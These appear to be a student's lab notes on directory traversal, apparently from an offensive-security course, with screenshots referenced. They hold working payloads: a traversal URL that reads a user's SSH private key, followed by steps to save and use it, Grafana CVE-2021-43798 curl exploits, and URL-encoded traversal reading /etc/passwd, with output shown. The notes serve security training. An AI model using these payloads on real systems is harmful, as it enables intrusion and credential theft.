
### ABSOLUTE VS RELATIVE PATHS
![[Pasted image 20230930071008.png]]
### DIRECTORY TRAVERSAL

https://sql--injection.blogspot.com/p/directory-traversal.html

you can use as many ../../ as possible because it can go as back as the food folders but no more

Notice that the page has a index.php
![[Pasted image 20230927201339.png]]

Notice that the admin link has a admin.php
![[Pasted image 20230927201458.png]]
Using Dir xversal we can see
![[Pasted image 20230927201746.png]]
![[Pasted image 20230927201808.png]]

http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../../home/offsec/.ssh/id_rsa

you can use curl to get the key in a better format

once you get the key, save it in a txt using the mousepad command (user friendly)

once done, change the permissions of the file with the key!

chmod 400 "file"

make sure you copy the whole key (including the start/end sentence)
![[Pasted image 20230927202840.png]]


Using Grafana for CVE 2021-43798
https://github.com/taythebot/CVE-2021-43798
curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../../Users/install.txt

### ENCODING SPECIAL CHARACTERS

https://blog.certcube.com/a-guide-to-directory-traversal-vulnerability/

If you cannot get information with regular directory traversal, use special encoding
┌──(hollacosta㉿kali1)-[~]
└─$ curl http://192.168.249.16/cgi-bin/../../../../../../../etc/passwd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>

┌──(hollacosta㉿kali1)-[~]
└─$ curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin


 curl --path-as-is http://192.168.249.16:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopt/install.txt

![[Pasted image 20230928110120.png]]

